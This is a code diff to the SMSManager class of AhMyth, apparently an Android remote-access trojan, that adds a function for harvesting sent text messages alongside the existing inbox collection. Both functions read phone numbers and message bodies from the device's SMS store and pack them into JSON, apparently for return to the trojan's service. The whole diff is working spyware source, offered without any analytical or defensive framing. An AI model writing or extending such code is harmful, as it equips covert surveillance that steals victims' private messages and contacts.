@@ -1,5 +1,3 @@
-package ahmyth.mine.king.ahmyth;
-
 import android.database.Cursor;
 import android.net.Uri;
 import android.telephony.SmsManager;
@@ -10,15 +8,16 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 /**
- * Created by AhMyth on 11/10/16.
- */
+* Created by AhMyth on 11/10/16.
+*/
 
 public class SMSManager {
 
-    public static JSONObject getSMSList(){
+    // Inbox SMS List
+    public static JSONObject getInboxSMSList() {
 
         try {
-            JSONObject SMSList = new JSONObject();
+            JSONObject inboxSMSList = new JSONObject();
             JSONArray list = new JSONArray();
 
 
@@ -29,14 +28,45 @@ public class SMSManager {
                 JSONObject sms = new JSONObject();
                 String address = cur.getString(cur.getColumnIndex("address"));
                 String body = cur.getString(cur.getColumnIndexOrThrow("body"));
-                sms.put("phoneNo" , address);
-                sms.put("msg" , body);
+                sms.put("phoneNo", address);
+                sms.put("msg", body);
                 list.put(sms);
 
             }
-            SMSList.put("smsList", list);
-            Log.e("done" ,"collecting");
-            return SMSList;
+            inboxSMSList.put("inboxSMSList", list);
+            Log.e("done", "collecting");
+            return inboxSMSList;
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+
+        return null;
+
+    }
+
+    // Sent SMS List
+    public static JSONObject getSentSMSList() {
+
+        try {
+            JSONObject sentSMSList = new JSONObject();
+            JSONArray list = new JSONArray();
+
+
+            Uri uriSMSURI = Uri.parse("content://sms/sent");
+            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);
+
+            while (cur.moveToNext()) {
+                JSONObject sms = new JSONObject();
+                String address = cur.getString(cur.getColumnIndex("address"));
+                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
+                sms.put("phoneNo", address);
+                sms.put("msg", body);
+                list.put(sms);
+
+            }
+            sentSMSList.put("sentSMSList", list);
+            Log.e("done", "collecting");
+            return sentSMSList;
         } catch (JSONException e) {
             e.printStackTrace();
         }
